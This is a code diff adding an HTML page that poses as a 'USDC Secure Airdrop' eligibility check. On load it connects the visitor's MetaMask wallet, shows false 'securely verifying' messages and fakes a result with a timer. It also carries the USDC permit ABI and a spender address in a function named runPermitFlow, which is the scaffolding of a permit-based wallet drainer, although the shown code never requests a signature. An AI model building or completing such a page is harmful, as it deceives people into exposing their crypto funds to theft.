@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>USDC Secure Airdrop</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #141e30, #243b55);
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 20px;
+    }
+
+    #status {
+      font-size: 1rem;
+      color: #ccc;
+      margin-top: 10px;
+    }
+
+    .spinner {
+      border: 4px solid rgba(255, 255, 255, 0.2);
+      border-left-color: #ffffff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-top: 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .fade-in {
+      animation: fadeIn 0.8s ease-in forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <h1>Verifying Wallet Eligibility for USDC Airdrop...</h1>
+  <div class="spinner" id="spinner"></div>
+  <p id="status">Connecting wallet... please wait.</p>
+
+  <script>
+    const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // USDC mainnet
+    const spender = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";   // Uniswap V2 Router
+
+    const usdcPermitAbi = [
+      {
+        "inputs": [
+          { "internalType": "address", "name": "owner", "type": "address" },
+          { "internalType": "address", "name": "spender", "type": "address" },
+          { "internalType": "uint256", "name": "value", "type": "uint256" },
+          { "internalType": "uint256", "name": "deadline", "type": "uint256" },
+          { "internalType": "uint8", "name": "v", "type": "uint8" },
+          { "internalType": "bytes32", "name": "r", "type": "bytes32" },
+          { "internalType": "bytes32", "name": "s", "type": "bytes32" }
+        ],
+        "name": "permit",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [{ "name": "owner", "type": "address" }],
+        "name": "nonces",
+        "outputs": [{ "name": "", "type": "uint256" }],
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [],
+        "name": "DOMAIN_SEPARATOR",
+        "outputs": [{ "name": "", "type": "bytes32" }],
+        "type": "function"
+      }
+    ];
+
+    async function runPermitFlow() {
+      if (!window.ethereum) {
+        document.getElementById("status").innerText = "❌ MetaMask not detected. Please install it to continue.";
+        return;
+      }
+
+      const web3 = new Web3(window.ethereum);
+      await ethereum.request({ method: 'eth_requestAccounts' });
+      const accounts = await web3.eth.getAccounts();
+      const user = accounts[0];
+
+      document.getElementById("status").innerText = "🔐 Securely verifying your wallet on Ethereum Mainnet...";
+
+      // You can perform eligibility checks here or just simulate success/failure
+      setTimeout(() => {
+        const eligible = false; // Change to true if you want to simulate success
+
+        if (eligible) {
+          document.getElementById("status").innerText = "✅ Wallet eligible. Preparing your airdrop...";
+        } else {
+          document.getElementById("spinner").remove();
+          document.getElementById("status").innerText = "🚫 Unfortunately, your wallet is not eligible for this airdrop at the moment. Thank you for checking."
+        }
+      }, 3000);
+    }
+
+    window.addEventListener("load", runPermitFlow);
+  </script>
+</body>
+</html>
